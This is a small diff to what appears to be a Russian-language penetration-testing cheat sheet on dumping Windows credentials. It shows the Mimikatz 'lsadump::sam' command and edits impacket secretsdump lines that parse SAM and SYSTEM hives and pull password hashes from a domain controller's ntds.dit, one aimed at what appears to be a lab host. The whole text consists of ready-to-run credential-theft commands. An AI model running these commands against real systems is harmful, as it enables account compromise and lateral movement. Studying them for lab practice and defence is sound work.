@@ -84,9 +84,12 @@ kiwi_cmd lsadump::sam
 
 -----Распарсить SAM
 
-python secretsdump.py -sam sam -system system LOCAL 
+secretsdump.py -sam sam -system system LOCAL 
 
 impacket-secretsdump hacker.local/user:password@ip_adress
+
+secretsdump.py hacker.local/user:password@ip_adress
+
 
 secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 --> password (Снаружи домена парсит ntds.dit)
 
